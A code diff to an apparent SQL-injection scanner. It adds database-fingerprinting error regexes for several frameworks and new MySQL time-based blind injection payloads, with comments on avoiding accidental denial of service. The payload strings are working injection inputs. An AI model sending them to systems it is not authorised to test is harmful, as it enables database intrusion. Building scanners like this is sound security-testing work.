@@ -21,6 +21,7 @@ DB_ERROR_SIGNATURES = {
         r"MySQLSyntaxErrorException",
         r"valid MySQL result",
         r"MariaDB server version",
+        r"dialects[/\\](?:mysql|mariadb)[/\\]",       # Sequelize (Node.js) stack trace
     ],
     "PostgreSQL": [
         r"PostgreSQL.{0,40}ERROR",
@@ -28,6 +29,7 @@ DB_ERROR_SIGNATURES = {
         r"PSQLException",
         r"unterminated quoted string at or near",
         r"syntax error at or near",
+        r"dialects[/\\]postgres[/\\]",
     ],
     "Microsoft SQL Server": [
         r"Unclosed quotation mark after the character string",
@@ -35,17 +37,27 @@ DB_ERROR_SIGNATURES = {
         r"ODBC SQL Server Driver",
         r"SQLServerException",
         r"Incorrect syntax near",
+        r"dialects[/\\]mssql[/\\]",
     ],
     "SQLite": [
         r"SQLite3?::",
         r"sqlite3\.OperationalError",
         r"SQLITE_ERROR",
         r"unrecognized token:",
+        r"dialects[/\\]sqlite[/\\]",
     ],
     "Oracle": [
         r"\bORA-\d{5}",
         r"quoted string not properly terminated",
         r"Oracle.{0,20}Driver",
+    ],
+    # Framework/driver errors that prove a SQL failure but do not name the DBMS.
+    "unknown (generic SQL error)": [
+        r"SQLSTATE\[\w+\]",                # PHP PDO
+        r"SequelizeDatabaseError",          # Node.js Sequelize ORM
+        r"java\.sql\.SQLException",         # Java JDBC
+        r"django\.db\.utils\.\w*Error",     # Python Django
+        r"System\.Data\.SqlClient",          # .NET
     ],
 }
 
@@ -66,12 +78,22 @@ BOOLEAN_PAIRS = [
 ]
 
 # Time-based blind: (DBMS, template). {d} is the delay in seconds.
-# AND (not OR) is used on purpose: OR SLEEP() would sleep once for EVERY row in
-# the table, which could tie up the target database (an accidental DoS).
+# A plain "OR SLEEP()" is NEVER used: it sleeps once for EVERY row in the table
+# (measured: 13 s for a 1 s sleep on a 13-row table), an accidental DoS.
+# Two safe forms are used instead:
+#   * AND SLEEP(d): only runs when the original value matches a row.
+#   * OR (SELECT 1 FROM (SELECT SLEEP(d))x)=2: the derived table is built ONCE,
+#     so it sleeps exactly once, and "=2" is always false, so no rows are
+#     returned (no login bypass). Works even when the original value matches
+#     nothing, e.g. a login form's username field.
 TIME_PAYLOADS = [
     ("MySQL/MariaDB", "' AND SLEEP({d})-- -"),
     ("MySQL/MariaDB", " AND SLEEP({d})"),
     ("MySQL/MariaDB", "\" AND SLEEP({d})-- -"),
+    ("MySQL/MariaDB", "' OR (SELECT 1 FROM (SELECT SLEEP({d}))x)=2-- -"),
+    ("MySQL/MariaDB", "\" OR (SELECT 1 FROM (SELECT SLEEP({d}))x)=2-- -"),
+    ("MySQL/MariaDB", "') OR (SELECT 1 FROM (SELECT SLEEP({d}))x)=2-- -"),
+    ("MySQL/MariaDB", "\") OR (SELECT 1 FROM (SELECT SLEEP({d}))x)=2-- -"),
     ("PostgreSQL", "' AND 1=(SELECT 1 FROM pg_sleep({d}))-- -"),
     ("PostgreSQL", " AND 1=(SELECT 1 FROM pg_sleep({d}))"),
     ("Microsoft SQL Server", "'; WAITFOR DELAY '0:0:{d}'-- -"),
